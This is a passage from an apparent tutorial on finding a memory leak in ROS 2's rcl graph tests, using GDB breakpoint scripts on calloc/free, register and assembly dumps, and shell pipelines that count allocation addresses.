    0x00007ffff66444d7 __default_zero_allocate+39 leaveq
    0x00007ffff66444d8 __default_zero_allocate+40 retq
    ─── Expressions ──────────────────────────────────────────────────────────────────────────────
    ─── History ──────────────────────────────────────────────────────────────────────────────────
    $$0 = 88
    ─── Memory ───────────────────────────────────────────────────────────────────────────────────
    ─── Registers ────────────────────────────────────────────────────────────────────────────────
       rax 0x0000608000000120         rbx 0x00007fffffff1cf0         rcx 0x0000000000000000
       rdx 0x0000000000000058         rsi 0x0000000000000000         rdi 0x0000608000000120
       rbp 0x00007ffffffefe40         rsp 0x00007ffffffefe20          r8 0x0000000000000000
        r9 0x0000000000000000         r10 0x00007ffffffef650         r11 0x00007ffffffef650
       r12 0x00000fffffffdfde         r13 0x00007ffffffefef0         r14 0x0000603000033730
       r15 0x00007ffffffefef0         rip 0x00007ffff66444d7      eflags [ PF ZF IF ]
        cs 0x00000033                  ss 0x0000002b                  ds 0x00000000
        es 0x00000000                  fs 0x00000000                  gs 0x00000000
    ─── Source ───────────────────────────────────────────────────────────────────────────────────
    52 static void *
    53 __default_zero_allocate(size_t number_of_elements, size_t size_of_element, void * state)
    54 {
    55   RCUTILS_UNUSED(state);
    56   return calloc(number_of_elements, size_of_element);
    57 }
    58
    59 rcutils_allocator_t
    60 rcutils_get_zero_initialized_allocator(void)
    61 {
    62   static rcutils_allocator_t zero_allocator = {
    ```</code></pre>
    </details>
    <p>It seems that <code>__default_zero_allocate+39</code> is the point where we can fetch the memory address allocated in the heap (from <code>rax</code> register). In the example above <code>0x0000608000000120</code>. This can be double checked by putting a breakpoint at <code>b rcl/init.c:79</code> and checking the address of <code>context-&gt;impl</code>:</p>
    <details>
    <summary>
    Debug session 4
    </summary>
    <pre class="smallcontent"><code>```bash
    &gt;&gt;&gt; b rcl/init.c:79
    Breakpoint 15 at 0x7ffff6bba4c0: file /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/init.c, line 79.
    &gt;&gt;&gt; down
    #0  __default_zero_allocate (number_of_elements=1, size_of_element=88, state=0x0) at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:57
    57  }
    &gt;&gt;&gt; c
    Continuing.
    ─── Output/messages ──────────────────────────────────────────────────────────────────────────
    ─── Assembly ─────────────────────────────────────────────────────────────────────────────────
    0x00007ffff6bba4b0 rcl_init+2029 callq  0x7ffff6ba4e80 &lt;__asan_report_store8@plt&gt;
    0x00007ffff6bba4b5 rcl_init+2034 mov    -0x1ea0(%rbp),%rax
    0x00007ffff6bba4bc rcl_init+2041 mov    %rcx,0x8(%rax)
    0x00007ffff6bba4c0 rcl_init+2045 mov    -0x1ea0(%rbp),%rax
    0x00007ffff6bba4c7 rcl_init+2052 mov    0x8(%rax),%rax
    0x00007ffff6bba4cb rcl_init+2056 test   %rax,%rax
    0x00007ffff6bba4ce rcl_init+2059 jne    0x7ffff6bba4f2 &lt;rcl_init+2095&gt;
    ─── Expressions ──────────────────────────────────────────────────────────────────────────────
    ─── History ──────────────────────────────────────────────────────────────────────────────────
    $$0 = 88
    ─── Memory ───────────────────────────────────────────────────────────────────────────────────
    ─── Registers ────────────────────────────────────────────────────────────────────────────────
       rax 0x0000603000033730         rbx 0x00007fffffff1cf0         rcx 0x0000608000000120
       rdx 0x0000000000000000         rsi 0x0000000000000000         rdi 0x0000608000000120
       rbp 0x00007fffffff1d20         rsp 0x00007ffffffefe50          r8 0x0000000000000000
        r9 0x0000000000000000         r10 0x00007ffffffef650         r11 0x00007ffffffef650
       r12 0x00000fffffffdfde         r13 0x00007ffffffefef0         r14 0x0000603000033730
       r15 0x00007ffffffefef0         rip 0x00007ffff6bba4c0      eflags [ PF ZF IF ]
        cs 0x00000033                  ss 0x0000002b                  ds 0x00000000
        es 0x00000000                  fs 0x00000000                  gs 0x00000000
    ─── Source ───────────────────────────────────────────────────────────────────────────────────
    74   context-&gt;global_arguments = rcl_get_zero_initialized_arguments();
    75
    76   // Setup impl for context.
    77   // use zero_allocate so the cleanup function will not try to clean up uninitialized parts later
    78   context-&gt;impl = allocator.zero_allocate(1, sizeof(rcl_context_impl_t), allocator.state);
    79   RCL_CHECK_FOR_NULL_WITH_MSG(
    80     context-&gt;impl, &quot;failed to allocate memory for context impl&quot;, return RCL_RET_BAD_ALLOC);
    81
    82   // Zero initialize rmw context first so its validity can by checked in cleanup.
    83   context-&gt;impl-&gt;rmw_context = rmw_get_zero_initialized_context();
    84
    ─── Stack ────────────────────────────────────────────────────────────────────────────────────
    [0] from 0x00007ffff6bba4c0 in rcl_init+2045 at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/init.c:79
    arg argc = 0
    arg argv = 0x0
    arg options = 0x7fffffff2000
    arg context = 0x603000033730
    [1] from 0x00005555555b4e08 in TestGraphFixture__rmw_fastrtps_cpp::SetUp at /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:77
    arg this = 0x606000001ca0
    [+]
    ─── Threads ──────────────────────────────────────────────────────────────────────────────────
    [1] id 19574 name test_graph__rmw from 0x00007ffff6bba4c0 in rcl_init+2045 at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/init.c:79
    ──────────────────────────────────────────────────────────────────────────────────────────────

    Breakpoint 15, rcl_init (argc=0, argv=0x0, options=0x7fffffff2000, context=0x603000033730) at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/init.c:79
    79    RCL_CHECK_FOR_NULL_WITH_MSG(
    &gt;&gt;&gt; p context
    $2 = (rcl_context_t *) 0x603000033730
    &gt;&gt;&gt; p context-&gt;impl
    $3 = (struct rcl_context_impl_t *) 0x608000000120
    ```</code></pre>
    </details>
    <p>For fun, let’s try to see what’s the offset in <code>calloc</code> that provides the pointer that addresses the portion of memory allocated in the heap. We start by breaking in <code>__default_zero_allocate</code> (<code>b __default_zero_allocate</code>) and then (once in here), in <code>calloc</code> (<code>b calloc</code>).</p>
    <p>We know that the address will be in the <code>0x60800000XXXX</code> range (more or less, look at the heap boundaries for more specific answer) and to speed up the process, we can take a peek at the assembly code of calloc once we’ve broken there:</p>
    <details>
    <summary>
    Debug session 5
    </summary>
    <pre class="smallcontent"><code>```bash
    &gt;&gt;&gt; x/90i $pc
    =&gt; 0x7ffff6ef8d6c &lt;calloc+252&gt;: cmpb   $0x0,0xd8c0(%rax)
       0x7ffff6ef8d73 &lt;calloc+259&gt;: jne    0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8d79 &lt;calloc+265&gt;: mov    %rax,%rdi
       0x7ffff6ef8d7c &lt;calloc+268&gt;: mov    %rax,-0x860(%rbp)
       0x7ffff6ef8d83 &lt;calloc+275&gt;: callq  0x7ffff6f07c20
       0x7ffff6ef8d88 &lt;calloc+280&gt;: mov    -0x860(%rbp),%r10
       0x7ffff6ef8d8f &lt;calloc+287&gt;: mov    %rax,-0x868(%rbp)
       0x7ffff6ef8d96 &lt;calloc+294&gt;: mov    %r10,%rdi
       0x7ffff6ef8d99 &lt;calloc+297&gt;: callq  0x7ffff6f07c80
       0x7ffff6ef8d9e &lt;calloc+302&gt;: mov    -0x860(%rbp),%r10
       0x7ffff6ef8da5 &lt;calloc+309&gt;: mov    -0x854(%rbp),%esi
       0x7ffff6ef8dab &lt;calloc+315&gt;: mov    %rbp,%rcx
       0x7ffff6ef8dae &lt;calloc+318&gt;: mov    -0x868(%rbp),%r9
       0x7ffff6ef8db5 &lt;calloc+325&gt;: xor    %r8d,%r8d
       0x7ffff6ef8db8 &lt;calloc+328&gt;: mov    %r15,%rdx
       0x7ffff6ef8dbb &lt;calloc+331&gt;: mov    %rbx,%rdi
       0x7ffff6ef8dbe &lt;calloc+334&gt;: movb   $0x1,0xd8c0(%r10)
       0x7ffff6ef8dc6 &lt;calloc+342&gt;: push   %r14
       0x7ffff6ef8dc8 &lt;calloc+344&gt;: push   %rax
       0x7ffff6ef8dc9 &lt;calloc+345&gt;: callq  0x7ffff6f1ddf0
       0x7ffff6ef8dce &lt;calloc+350&gt;: mov    -0x860(%rbp),%r10
       0x7ffff6ef8dd5 &lt;calloc+357&gt;: movb   $0x0,0xd8c0(%r10)
       0x7ffff6ef8ddd &lt;calloc+365&gt;: pop    %rcx
       0x7ffff6ef8dde &lt;calloc+366&gt;: pop    %rsi
       0x7ffff6ef8ddf &lt;calloc+367&gt;: jmpq   0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8de4 &lt;calloc+372&gt;: nopl   0x0(%rax)
       0x7ffff6ef8de8 &lt;calloc+376&gt;: mov    %rbp,-0x40(%rbp)
       0x7ffff6ef8dec &lt;calloc+380&gt;: callq  0x7ffff6f1d890
       0x7ffff6ef8df1 &lt;calloc+385&gt;: mov    %rax,-0x840(%rbp)
       0x7ffff6ef8df8 &lt;calloc+392&gt;: callq  0x7ffff6f06df0
       0x7ffff6ef8dfd &lt;calloc+397&gt;: cmp    $0x1,%eax
       0x7ffff6ef8e00 &lt;calloc+400&gt;: jbe    0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8e06 &lt;calloc+406&gt;: mov    0x8(%rbp),%rax
       0x7ffff6ef8e0a &lt;calloc+410&gt;: mov    %rax,-0x838(%rbp)
       0x7ffff6ef8e11 &lt;calloc+417&gt;: jmpq   0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8e16 &lt;calloc+422&gt;: nopw   %cs:0x0(%rax,%rax,1)
       0x7ffff6ef8e20 &lt;calloc+432&gt;: test   %r14b,%r14b
       0x7ffff6ef8e23 &lt;calloc+435&gt;: jne    0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8e29 &lt;calloc+441&gt;: mov    -0x854(%rbp),%esi
       0x7ffff6ef8e2f &lt;calloc+447&gt;: pushq  $0x0
       0x7ffff6ef8e31 &lt;calloc+449&gt;: mov    %r15,%rdx
       0x7ffff6ef8e34 &lt;calloc+452&gt;: pushq  $0x0
       0x7ffff6ef8e36 &lt;calloc+454&gt;: xor    %r9d,%r9d
       0x7ffff6ef8e39 &lt;calloc+457&gt;: xor    %r8d,%r8d
       0x7ffff6ef8e3c &lt;calloc+460&gt;: mov    %rbp,%rcx
       0x7ffff6ef8e3f &lt;calloc+463&gt;: mov    %rbx,%rdi
       0x7ffff6ef8e42 &lt;calloc+466&gt;: callq  0x7ffff6f1ddf0
       0x7ffff6ef8e47 &lt;calloc+471&gt;: pop    %rax
       0x7ffff6ef8e48 &lt;calloc+472&gt;: pop    %rdx
       0x7ffff6ef8e49 &lt;calloc+473&gt;: jmpq   0x7ffff6ef8cf3 &lt;calloc+131&gt;
       0x7ffff6ef8e4e &lt;calloc+478&gt;: xchg   %ax,%ax
       0x7ffff6ef8e50 &lt;calloc+480&gt;: imul   %rsi,%rdi
       0x7ffff6ef8e54 &lt;calloc+484&gt;: callq  0x7ffff6ef8690
       0x7ffff6ef8e59 &lt;calloc+489&gt;: jmpq   0x7ffff6ef8d01 &lt;calloc+145&gt;
       0x7ffff6ef8e5e &lt;calloc+494&gt;: callq  0x7ffff6e3a780 &lt;__stack_chk_fail@plt&gt;
       0x7ffff6ef8e63:  nopl   (%rax)
       0x7ffff6ef8e66:  nopw   %cs:0x0(%rax,%rax,1)
       0x7ffff6ef8e70 &lt;realloc&gt;:    push   %rbp
       0x7ffff6ef8e71 &lt;realloc+1&gt;:  mov    %rsp,%rbp
       0x7ffff6ef8e74 &lt;realloc+4&gt;:  push   %r15
       0x7ffff6ef8e76 &lt;realloc+6&gt;:  push   %r14
    ```</code></pre>
    </details>
    <p>In short, to verify that we indeed are getting the right values for the dynamica memory allocated:</p>
    <pre class="smallcontent"><code>```bash
    # within gdb
    b main
    b __default_zero_allocate
    b *(calloc-15694047)
    b rcl/init.c:79
    p context-&gt;impl
    ```</code></pre>
    <p>Putting it together in a gdb script:</p>
    <pre class="smallcontent"><code>```bash
    set pagination off
    set breakpoint pending on
    set logging file gdbcmd1.out
    set logging on
    hbreak calloc
    commands
      set $callocsize = (unsigned long long) $rsi  
      continue
    end
    hbreak *(calloc-15694047)
    commands
      printf &quot;calloc(%lld) = 0x%016llx\n&quot;, $callocsize, $rax
      continue
    end
    hbreak free
    commands
      printf &quot;free(0x%016llx)\n&quot;, (unsigned long long) $rdi
      continue
    end
    continue
    ```</code></pre>
    <p>(after disabling a few of the hw breakpoints) generating a big file https://gist.github.com/vmayoral/57ea38f9614cbfd1b5d7e93d92c15e13. Browsing through this file, let’s coun the calloc counts in those cases where we allocate 56 bytes (where the leak is):</p>
    <pre class="smallcontent"><code>```bash
    cat gdbcmd1.out | grep &quot;calloc(56)&quot; | awk &#39;{print $3}&#39; | sed &quot;s/^/cat gdbcmd1.out | grep -c /g&quot;
    cat gdbcmd1.out | grep -c 0x000060600000af40
    cat gdbcmd1.out | grep -c 0x0000602000008f90
    cat gdbcmd1.out | grep -c 0x0000616000012c80
    cat gdbcmd1.out | grep -c 0x000060600001dba0
    cat gdbcmd1.out | grep -c 0x0000606000039bc0
    cat gdbcmd1.out | grep -c 0x000060b0000cf4c0
    cat gdbcmd1.out | grep -c 0x000060b0000cf990
    cat gdbcmd1.out | grep -c 0x000060b0000cfd00
    cat gdbcmd1.out | grep -c 0x00006060000436a0
    cat gdbcmd1.out | grep -c 0x000060600005c060
    cat gdbcmd1.out | grep -c 0x000060600005c1e0
    cat gdbcmd1.out | grep -c 0x000060600005c300
    cat gdbcmd1.out | grep -c 0x000060600005c420
    cat gdbcmd1.out | grep -c 0x000060600005c5a0
    cat gdbcmd1.out | grep -c 0x000060600005c720
    cat gdbcmd1.out | grep -c 0x000060600005c840
    cat gdbcmd1.out | grep -c 0x000060600005c960
    cat gdbcmd1.out | grep -c 0x000060600005cae0
    cat gdbcmd1.out | grep -c 0x000060600005cc00
    cat gdbcmd1.out | grep -c 0x000060600005cd20
    cat gdbcmd1.out | grep -c 0x000060600005cea0
    cat gdbcmd1.out | grep -c 0x000060600005cfc0
    cat gdbcmd1.out | grep -c 0x000060600005d0e0
    cat gdbcmd1.out | grep -c 0x000060600005d260
    cat gdbcmd1.out | grep -c 0x000060600005d380
    cat gdbcmd1.out | grep -c 0x000060600005d4a0
    cat gdbcmd1.out | grep -c 0x000060600005d5c0
    cat gdbcmd1.out | grep -c 0x000060b000148830
    cat gdbcmd1.out | grep -c 0x0000606000069b60
    cat gdbcmd1.out | grep -c 0x000060b000148d00
    cat gdbcmd1.out | grep -c 0x0000606000069e00
    cat gdbcmd1.out | grep -c 0x0000606000069f20
    cat gdbcmd1.out | grep -c 0x000060600006a040
    cat gdbcmd1.out | grep -c 0x000060600006a160
    cat gdbcmd1.out | grep -c 0x000060600006a280
    cat gdbcmd1.out | grep -c 0x00006060000717e0
    cat gdbcmd1.out | grep -c 0x00006060000718a0
    cat gdbcmd1.out | grep -c 0x00006060000719c0
    cat gdbcmd1.out | grep -c 0x0000606000071c00
    cat gdbcmd1.out | grep -c 0x0000606000071cc0
    cat gdbcmd1.out | grep -c 0x0000606000071de0
    cat gdbcmd1.out | grep -c 0x0000606000071f00
    cat gdbcmd1.out | grep -c 0x0000606000072020
    cat gdbcmd1.out | grep -c 0x0000606000072140
    cat gdbcmd1.out | grep -c 0x0000606000072260
    ```</code></pre>
    <p>which launched gets the following output:</p>
    <pre class="smallcontent"><code>```bash
    cat gdbcmd1.out | grep &quot;calloc(56)&quot; | awk &#39;{print $3}&#39; | sed &quot;s/^/cat gdbcmd1.out | grep -c /g&quot; | bash
    2
    2
    2
    1
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    2
    ```</code></pre>
    <p>We’re filtering by the address and we should expect to <em>always</em> get an even number (each calloc with its free) however we get an odd number for the address <code>0x000060600001dba0</code>:</p>
    <pre class="smallcontent"><code>```bash
    cat gdbcmd1.out  | grep &quot;0x000060600001dba0&quot;
    calloc(56) = 0x000060600001dba0
    ```</code></pre>
    <p>It seems this is not getting released! Let’s get back to gdb and debug where does this happens with a combination as follows:</p>
    <pre class="smallcontent"><code>```bash
    set pagination off
    hbreak calloc
    commands
      set $callocsize = (unsigned long long) $rsi  
      continue
    end
    break *(calloc-15694047) if $callocsize == 56
    printf &quot;calloc(%d) = 0x%016llx\n&quot;, $callocsize, $rax
    ```</code></pre>
    <p>In combination with:</p>
    <pre class="smallcontent"><code>```bash
    break free
    p $rdi
    c
    ```</code></pre>
    <p>It’s easy to validate that the 4th iteration is leaky. Further investigating here:</p>
    <pre class="smallcontent"><code>```bash
    &gt;&gt;&gt; where
    #0  0x00007ffff6ef8d01 in calloc () from /usr/lib/x86_64-linux-gnu/libasan.so.4
    #1  0x00007ffff66444d7 in __default_zero_allocate (number_of_elements=1, size_of_element=56, state=0x0) at /opt/ros2_asan_ws/src/ros2/rcutils/src/allocator.c:56
    #2  0x00007ffff6435c7f in rmw_names_and_types_init (names_and_types=0x7fffffff11e0, size=1, allocator=0x7fffffff03c0) at /opt/ros2_asan_ws/src/ros2/rmw/rmw/src/names_and_types.c:72
    #3  0x00007ffff3cde35b in rmw_fastrtps_shared_cpp::__copy_data_to_results (topics=std::map with 1 element = {...}, allocator=0x7fffffff03c0, no_demangle=false, topic_names_and_types=0x7fffffff11e0) at /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:199
    #4  0x00007ffff3ce0c46 in rmw_fastrtps_shared_cpp::__rmw_get_topic_names_and_types_by_node(char const*, rmw_node_t const*, rcutils_allocator_t*, char const*, char const*, bool, std::function&lt;LockedObject&lt;TopicCache&gt; const&amp; (CustomParticipantInfo&amp;)&gt;&amp;, rmw_names_and_types_t*) (identifier=0x7ffff6919660 &quot;rmw_fastrtps_cpp&quot;, node=0x604000011990, allocator=0x7fffffff03c0, node_name=0x55555566a560 &quot;test_graph_node&quot;, node_namespace=0x7ffff6bf4620 &quot;/&quot;, no_demangle=false, retrieve_cache_func=..., topic_names_and_types=0x7fffffff11e0) at /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:349
    #5  0x00007ffff3ce10cd in rmw_fastrtps_shared_cpp::__rmw_get_publisher_names_and_types_by_node (identifier=0x7ffff6919660 &quot;rmw_fastrtps_cpp&quot;, node=0x604000011990, allocator=0x7fffffff03c0, node_name=0x55555566a560 &quot;test_graph_node&quot;, node_namespace=0x7ffff6bf4620 &quot;/&quot;, no_demangle=false, topic_names_and_types=0x7fffffff11e0) at /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_shared_cpp/src/rmw_node_info_and_types.cpp:385
    #6  0x00007ffff68f21ec in rmw_get_publisher_names_and_types_by_node (node=0x604000011990, allocator=0x7fffffff03c0, node_name=0x55555566a560 &quot;test_graph_node&quot;, node_namespace=0x7ffff6bf4620 &quot;/&quot;, no_demangle=false, topic_names_and_types=0x7fffffff11e0) at /opt/ros2_asan_ws/src/ros2/rmw_fastrtps/rmw_fastrtps_cpp/src/rmw_node_info_and_types.cpp:53
    #7  0x00007ffff6bb7876 in rcl_get_publisher_names_and_types_by_node (node=0x60200000bb90, allocator=0x7fffffff1120, no_demangle=false, node_name=0x55555566a560 &quot;test_graph_node&quot;, node_namespace=0x555555669ae0 &quot;&quot;, topic_names_and_types=0x7fffffff11e0) at /opt/ros2_asan_ws/src/ros2/rcl/rcl/src/rcl/graph.c:60
    #8  0x00005555555910ee in TestGraphFixture__rmw_fastrtps_cpp_test_rcl_get_publisher_names_and_types_by_node_Test::TestBody (this=0x606000015fe0) at /opt/ros2_asan_ws/src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342
    #9  0x0000555555649216 in testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt; (object=0x606000015fe0, method=&amp;virtual testing::Test::TestBody(), location=0x555555676dc0 &quot;the test body&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
    #10 0x000055555563b36a in testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt; (object=0x606000015fe0, method=&amp;virtual testing::Test::TestBody(), location=0x555555676dc0 &quot;the test body&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
    #11 0x00005555555e7e52 in testing::Test::Run (this=0x606000015fe0) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2522
    #12 0x00005555555e927d in testing::TestInfo::Run (this=0x6120000004c0) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2703
    #13 0x00005555555e9e21 in testing::TestCase::Run (this=0x611000000400) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2825
    #14 0x0000555555604f32 in testing::internal::UnitTestImpl::RunAllTests (this=0x615000000800) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:5216
    #15 0x000055555564bcc9 in testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt; (object=0x615000000800, method=(bool (testing::internal::UnitTestImpl::*)(testing::internal::UnitTestImpl * const)) 0x555555604842 &lt;testing::internal::UnitTestImpl::RunAllTests()&gt;, location=0x55555567ae60 &quot;auxiliary test code (environments or event listeners)&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2447
    #16 0x000055555563d633 in testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt; (object=0x615000000800, method=(bool (testing::internal::UnitTestImpl::*)(testing::internal::UnitTestImpl * const)) 0x555555604842 &lt;testing::internal::UnitTestImpl::RunAllTests()&gt;, location=0x55555567ae60 &quot;auxiliary test code (environments or event listeners)&quot;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:2483
    #17 0x0000555555601cc6 in testing::UnitTest::Run (this=0x5555558bea80 &lt;testing::UnitTest::GetInstance()::instance&gt;) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/./src/gtest.cc:4824
    #18 0x00005555555d5215 in RUN_ALL_TESTS () at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/include/gtest/gtest.h:2370
    #19 0x00005555555d515b in main (argc=1, argv=0x7fffffff4b28) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:36
    ```</code></pre>
    <p>Which tells us the exact same information Asan did already :). In other words, we reached the same conclusion, the problem seems to be at <code>src/ros2/rcl/rcl/test/rcl/test_graph.cpp:342</code>.</p>
    <p>Inspecting the code, it seems like key might be in the call to <code>rmw_names_and_types_init</code> which in exchange gets deallocated by <code>rmw_names_and_types_fini</code>. Let’s check whether all the memory reservations of 56 bytes do call <code>rmw_names_and_types_fini</code>. Let’s first analyze the typical call to <code>rmw_names_and_types_fini</code> after hitting one of the points we’re interested in (we break in <code>rmw_names_and_types_fini</code> (<code>b rmw_names_and_types_fini</code>)):</p>
    <details>
    <summary>
    Debug session 6
    </summary>
    <pre class="smallcontent"><code>```bash
    gdb ./test_graph__rmw_fastrtps_cpp
    GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
    Copyright (C) 2018 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
    and &quot;show warranty&quot; for details.
    This GDB was configured as &quot;x86_64-linux-gnu&quot;.
    Type &quot;show configuration&quot; for configuration details.
    For bug reporting instructions, please see:
    &lt;http://www.gnu.org/software/gdb/bugs/&gt;.
    Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
    For help, type &quot;help&quot;.
    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
    Reading symbols from ./test_graph__rmw_fastrtps_cpp...done.
    &gt;&gt;&gt; b main
    Breakpoint 1 at 0x8112b: file /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc, line 34.
    &gt;&gt;&gt; r
    Starting program: /opt/ros2_asan_ws/build-asan/rcl/test/test_graph__rmw_fastrtps_cpp
    ─── Output/messages ───────────────────────────────────────────────────────────────────────────────
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
    ─── Assembly ──────────────────────────────────────────────────────────────────────────────────────
    0x00005555555d5120 main+4  sub    $0x10,%rsp
    0x00005555555d5124 main+8  mov    %edi,-0x4(%rbp)
    0x00005555555d5127 main+11 mov    %rsi,-0x10(%rbp)
    0x00005555555d512b main+15 lea    0x9d70e(%rip),%rsi        # 0x555555672840
    0x00005555555d5132 main+22 lea    0x9d787(%rip),%rdi        # 0x5555556728c0
    0x00005555555d5139 main+29 mov    $0x0,%eax
    0x00005555555d513e main+34 callq  0x5555555868e0 &lt;printf@plt&gt;
    ─── Expressions ───────────────────────────────────────────────────────────────────────────────────
    ─── History ───────────────────────────────────────────────────────────────────────────────────────
    ─── Memory ────────────────────────────────────────────────────────────────────────────────────────
    ─── Registers ─────────────────────────────────────────────────────────────────────────────────────
       rax 0x00005555555d511c           rbx 0x0000000000000000           rcx 0x0000000000000360
       rdx 0x00007fffffff4b38           rsi 0x00007fffffff4b28           rdi 0x0000000000000001
       rbp 0x00007fffffff4a40           rsp 0x00007fffffff4a30            r8 0x0000619000073f80
        r9 0x0000000000000000           r10 0x00007fffffff3e78           r11 0x00007fffffff3e78
       r12 0x0000555555586ba0           r13 0x00007fffffff4b20           r14 0x0000000000000000
       r15 0x0000000000000000           rip 0x00005555555d512b        eflags [ PF IF ]
        cs 0x00000033                    ss 0x0000002b                    ds 0x00000000
        es 0x00000000                    fs 0x00000000                    gs 0x00000000
    ─── Source ────────────────────────────────────────────────────────────────────────────────────────
    29
    30 #include &lt;stdio.h&gt;
    31 #include &quot;gtest/gtest.h&quot;
    32
    33 GTEST_API_ int main(int argc, char **argv) {
    34   printf(&quot;Running main() from %s\n&quot;, __FILE__);
    35   testing::InitGoogleTest(&amp;argc, argv);
    36   return RUN_ALL_TESTS();
    37 }
    ─── Stack ─────────────────────────────────────────────────────────────────────────────────────────
    [0] from 0x00005555555d512b in main+15 at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:34
    arg argc = 1
    arg argv = 0x7fffffff4b28
    ─── Threads ───────────────────────────────────────────────────────────────────────────────────────
    [1] id 1308 name test_graph__rmw from 0x00005555555d512b in main+15 at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:34
    ───────────────────────────────────────────────────────────────────────────────────────────────────

    Breakpoint 1, main (argc=1, argv=0x7fffffff4b28) at /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc:34
    34    printf(&quot;Running main() from %s\n&quot;, __FILE__);
    &gt;&gt;&gt; set pagination off
    &gt;&gt;&gt; hbreak calloc
    Hardware assisted breakpoint 2 at 0x7ffff56f6030: calloc. (3 locations)
    &gt;&gt;&gt; commands
    Type commands for breakpoint(s) 2, one per line.
    End with a line saying just &quot;end&quot;.
    &gt;  set $callocsize = (unsigned long long) $rsi
    &gt;  continue
    &gt;end
    &gt;&gt;&gt; break *(calloc-15694047) if $callocsize == 56
    Breakpoint 3 at 0x7ffff6ef8d01
    &gt;&gt;&gt; c
    Continuing.
    ─── Output/messages ───────────────────────────────────────────────────────────────────────────────
    Running main() from /opt/ros2_asan_ws/install-asan/gtest_vendor/src/gtest_vendor/src/gtest_main.cc
    [==========] Running 14 tests from 2 test cases.
    [----------] Global test environment set-up.
    [----------] 11 tests from TestGraphFixture__rmw_fastrtps_cpp
    [ RUN      ] TestGraphFixture__rmw_fastrtps_cpp.test_rcl_get_and_destroy_topic_names_and_types
    ─── Output/messages ───────────────────────────────────────────────────────────────────────────────
    ─── Assembly ──────────────────────────────────────────────────────────────────────────────────────
    Selected thread is running.
    ─── Expressions ───────────────────────────────────────────────────────────────────────────────────
    ─── History ───────────────────────────────────────────────────────────────────────────────────────
    ─── Memory ────────────────────────────────────────────────────────────────────────────────────────
    ─── Registers ─────────────────────────────────────────────────────────────────────────────────────
    ─── Source ────────────────────────────────────────────────────────────────────────────────────────
    ─── Stack ─────────────────────────────────────────────────────────────────────────────────────────
    ─── Threads ───────────────────────────────────────────────────────────────────────────────────────
    [1] id 1308 name test_graph__rmw (running)
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    Selected thread is running.
    &gt;&gt;&gt;
    ─── Output/messages ───────────────────────────────────────────────────────────────────────────────
    ─── Assembly ──────────────────────────────────────────────────────────────────────────────────────
    Selected thread is running.
    ─── Expressions ───────────────────────────────────────────────────────────────────────────────────
    ─── History ───────────────────────────────────────────────────────────────────────────────────────
    ─── Memory ────────────────────────────────────────────────────────────────────────────────────────
    ─── Registers ─────────────────────────────────────────────────────────────────────────────────────
    ─── Source ────────────────────────────────────────────────────────────────────────────────────────
    ─── Stack ─────────────────────────────────────────────────────────────────────────────────────────
    ─── Threads ───────────────────────────────────────────────────────────────────────────────────────
    [1] id 1308 name test_graph__rmw (running)
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    ...
    &gt;&gt;&gt; ─── Assembly ──────────────────────────────────────────────────────────────────────────────────────
